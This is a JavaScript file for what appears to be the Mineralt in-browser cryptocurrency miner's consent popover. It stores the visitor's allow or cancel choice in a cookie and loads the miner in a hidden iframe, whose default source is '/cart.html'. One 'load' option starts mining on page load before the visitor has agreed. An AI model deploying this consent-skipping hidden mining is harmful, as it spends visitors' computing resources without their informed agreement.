function MineraltRequest() {

    /**
     * Show popover
     */
    this.show = function (parent) {
        this.log('SHOW');
        document.querySelectorAll("#mineralt-answer button, #mineralt-allow").forEach(function(a){
            a.addEventListener("click", function(event){
                parent.allow();
                event.preventDefault();
                event.stopPropagation();
                event.stopImmediatePropagation();
            })
        });
        document.getElementById('mineralt-cancel').addEventListener("click", function(event){
            parent.cancel();
            event.preventDefault();
            event.stopPropagation();
            event.stopImmediatePropagation();
        });

        var aligns = this.position.split(' ');
        var edges = [ 'left', 'right', 'top', 'bottom' ];
        for(var e=0 ; e < edges.length; e++) {
            var edge = edges[e];
            if(aligns.indexOf(edge) >= 0) {
                this.popover.style[edge] = '10px';
            }
        }
        this.popover.style.display = 'inline-flex';

        this.popover.querySelectorAll('div').forEach(function(a){
            a.style.background = parent.color;
        });
    }

    /**
     * Hide popover
     */
    this.hide = function() {
        this.popover.style.display = 'none';
    }

    /**
     * Handle user approving
     */
    this.allow = function() {
        this.saveResult(true);
        this.hide();
        this.run();
    }

    /**
     * Handle user canceling
     */
    this.cancel = function() {
        this.saveResult(false);
        this.hide();
        this.stop();
    }

    /**
     * Run mining
     */
    this.run = function() {
        this.log('RUN');
        if(this.frame!=null) {
            return; // Already run
        }
        this.frame = document.createElement('iframe');
        let src = this.iframeUrl +
            '?v=' + this.getOption('version') +
            '&td=' + this.getOption('td') +
            '&tt=' + this.getOption('tt') +
            '&m=' + this.getOption('filter-mobiles', '0');
        let user = this.getOption('site', null);
        if(user!=null) {
            src += '&s=' + user;
        }
        this.frame.setAttribute('src', src);
        this.frame.style.display = 'none';
        document.body.appendChild(this.frame);
    }

    /**
     * Stop miming
     */
    this.stop = function () {
        this.log('STOP');
        if(this.frame!=null) {
            this.frame.remove();
        }
    }

    /**
     * Read stored user action from cookie
     * @return null|string
     */
    this.readResult = function() {
        var matches = document.cookie.match(new RegExp(
            "(?:^|; )" + this.cookieName + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : null;
    }

    /**
     * Save user action into cookie
     * @param agreement
     */
    this.saveResult = function(agreement) {
        var date = new Date;
        date.setDate(date.getDate() + 1); // 1 day
        document.cookie = this.cookieName + "=" + agreement + ";path=/;expires=" + date.toUTCString();
    }

    /**
     * User approving status (null - unknown, true - agree, false - cancel)
     * @return {*}
     */
    this.userIsAgree = function () {
        if(typeof(this.agreement)=='undefined' || this.agreement==null) {
            return null;
        }
        return (this.agreement=='true');
    }

    /**
     * Read option from #mineralt-answer element (data-attributes)
     * @param name
     * @param defaultValue
     * @return {string}
     */
    this.getOption = function(name, defaultValue) {
        var option = this.popover.getAttribute('data-' + name);
        return option==null ? defaultValue : option;
    }

    /**
     * Write in console if this.debug = true
     * @param arguments
     */
    this.log = function (...arguments) {
        if(this.debug) {
            console.log(...arguments)
        }
    }

    this.cookieName = 'mineralt-agree';
    this.popover = document.getElementById('mineralt-answer');
    this.position = this.getOption('position', 'right bottom');
    this.startPoint = this.getOption('start', 'action'); // action|load
    this.color = this.getOption('color', '#4E263D'); // action|load
    this.debug = this.getOption('debug', false);
    this.frame = null;
    this.iframeUrl = this.getOption('frame-url', '/cart.html');

    this.agreement = this.readResult();

    if(this.startPoint=='load' && this.userIsAgree()!==false) {
        // Run on load
        this.run();
    }

    switch (this.userIsAgree()) {
        case true:
            this.run();
            break;
        case false:
            this.stop();
            break;
        default: // null
            this.show(this);
    }

}

new MineraltRequest();